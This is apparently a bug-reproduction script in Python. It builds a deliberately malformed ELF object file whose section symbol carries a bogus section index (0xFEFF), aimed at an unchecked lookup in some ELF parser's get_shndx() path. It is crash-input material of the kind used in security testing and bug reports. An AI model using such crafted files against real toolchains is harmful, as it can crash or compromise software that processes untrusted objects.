#!/usr/bin/env python3
"""Second-variant repro for the same bug class: a direct (non-SHN_XINDEX) huge
st_shndx, exercising get_shndx()'s plain `return esym.st_shndx;` path instead
of the SHT_SYMTAB_SHNDX/SHN_XINDEX path exercised by gen_evil_elf.py.

st_shndx is a 16-bit field; SHN_LORESERVE (0xff00) and above is reserved, so
the largest directly-usable bogus value is 0xFEFF (65279) - still enormously
larger than this object's 4 real sections.
"""
import struct
import sys

SHT_SYMTAB = 2
SHT_STRTAB = 3

STT_SECTION = 3
STB_LOCAL = 0

BOGUS_SHNDX = 0xFEFF  # largest value below SHN_LORESERVE (0xff00)


def shdr(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size, link, info,
                        addralign, entsize)


def sym(name, info, other, shndx, value, size):
    return struct.pack("<IBBHQQ", name, info, other, shndx, value, size)


def build() -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_symtab = addname(".symtab")
    n_strtab = addname(".strtab")
    n_shstrtab = addname(".shstrtab")

    EHDR_SIZE = 64
    SHDR_SIZE = 64

    strtab_data = b"\x00"

    sym_null = sym(0, 0, 0, 0, 0, 0)
    sym_evil = sym(0, (STB_LOCAL << 4) | STT_SECTION, 0, BOGUS_SHNDX, 0, 0)
    symtab_data = sym_null + sym_evil

    # Section indices (4 sections total): 0 NULL, 1 .symtab, 2 .strtab, 3 .shstrtab
    IDX_STRTAB = 2
    IDX_SHSTRTAB = 3

    off = EHDR_SIZE
    off_symtab = off
    off += len(symtab_data)
    off_strtab = off
    off += len(strtab_data)
    off_shstrtab = off
    off += len(names)
    pad = (-off) % 8
    off += pad
    off_shdrs = off

    sh_null = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_symtab = shdr(n_symtab, SHT_SYMTAB, 0, 0, off_symtab, len(symtab_data),
                      IDX_STRTAB, 2, 8, 24)  # sh_info=2 -> first_global=2 (no globals)
    sh_strtab = shdr(n_strtab, SHT_STRTAB, 0, 0, off_strtab, len(strtab_data), 0, 0, 1, 0)
    sh_shstrtab = shdr(n_shstrtab, SHT_STRTAB, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)

    e_ident = bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) + b"\x00" * 8
    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,          # e_type = ET_REL
        62,         # e_machine = EM_X86_64
        1,          # e_version
        0,          # e_entry
        0,          # e_phoff
        off_shdrs,  # e_shoff
        0,          # e_flags
        EHDR_SIZE,
        0, 0,       # e_phentsize, e_phnum
        SHDR_SIZE,
        4,            # e_shnum
        IDX_SHSTRTAB,  # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return (ehdr + symtab_data + strtab_data + names + b"\x00" * pad +
            sh_null + sh_symtab + sh_strtab + sh_shstrtab)


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil2.o"
    with open(out_path, "wb") as f:
        f.write(build())
    print(f"wrote {out_path}")


if __name__ == "__main__":
    main()
